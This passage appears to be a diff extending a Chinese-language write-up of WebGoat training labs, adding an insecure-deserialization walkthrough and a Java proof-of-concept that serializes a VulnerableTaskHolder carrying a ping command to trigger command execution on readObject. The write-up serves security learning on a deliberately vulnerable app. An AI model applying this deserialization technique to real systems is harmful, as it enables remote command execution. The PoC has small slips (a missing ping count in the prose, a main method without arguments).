@@ -647,3 +647,68 @@ if ("tom".equals(username) && idorUserInfo.get("tom").get("password").equals(pas
 成功获得userid:2342388
 
 ![image-20260121175236113](WebGoat/image-20260121175236113.png)
+
+## InsecureDeserialization
+
+分析源码
+
+1. 将获取的base64 token进行符号处理，做了一个替换
+2. 将b64token通过base64解码为`byte[]`，使用`ByteArrayInputStream`将这段字节数组包装成内存输入流，使之成为可读的二进制数据源，再套上`ObjectInputStream` 包装成可读的对象输入流，最后调用`readObject()`反序列化字节序列为Java对象
+3. 判断对象是否是`VulnerableTaskHolder`实例，此处限定了要写Poc的序列化对象
+4. 限制了反序列化的执行时间大于3秒小于7秒，此处就需要通过反序列化执行命令达成该效果
+
+![image-20260122164021753](WebGoat/image-20260122164021753.png)
+
+接着来看一下要序列化的类`VulnerableTaskHolder`
+
+1. 实现了`Serializable`，代表这个类可序列化
+2. 给定`serialVersionUID`为2
+3. 有三个私有字段，其中`taskName`，`taskAction`可控
+
+![image-20260122170427258](WebGoat/image-20260122170427258.png)
+
+来看这个类`readObject()`具体的实现
+
+1. `defaultReadObject`会反序列化恢复`taskName`和`taskAction`
+2. `requestedExecutionTime`限制时间为当前时间前后10分钟内
+3. `taskAction`字段只能由sleep或ping开头且长度不超过22字节
+4. 将`taskAction`字段带入执行，所以要将需执行的命令写入此字段
+
+![image-20260122171237286](WebGoat/image-20260122171237286.png)
+
+总结一下整个反序列化流程：
+
+1. 获取反序列化字节 → base64解码 → 符号替换 → 内存输入流 → 对象输入流 → `ObjectInputStream.readObject`
+2. 进入`VulnerableTaskHolder.readobject`
+3. 通过`requestedExecutionTime`的时间校验
+4. 因为webgaot部署在Windows系统上，所以将`taskAction`字段赋值为`ping -n 127.0.0.1`在反序列化时卡住5秒，通过运行时间条件
+
+所以PoC的编写流程应该是：
+
+1. 创建`VulnerableTaskHolder`实例，并将`taskAction`字段赋值
+2. 因为源码中`requestedExecutionTime`就是LocalDateTime.now()，自然可以通过时间限制，所以不用通过反射修改
+3. 将实例对象按字节数组输入流、对象输入流，实例对象序列化的顺序包起来，代码像水管永远是从外向内包的，虽然数据流的反向是相反的
+
+PoC如下
+
+```java
+package org.dummy.insecure.framework;
+
+import java.io.*;
+import java.util.Base64;
+public class Exp {
+    public static void main() throws Exception{
+        VulnerableTaskHolder exp = new VulnerableTaskHolder("exp", "ping -n 5 127.0.0.1");
+
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try(ObjectOutputStream oos = new ObjectOutputStream(bos)) {
+            oos.writeObject(exp);
+        }
+
+        String b64 = Base64.getEncoder().encodeToString(bos.toByteArray())
+                .replace('+', '-')
+                .replace('/', '_');
+        System.out.printf(b64);
+    }
+}
+```
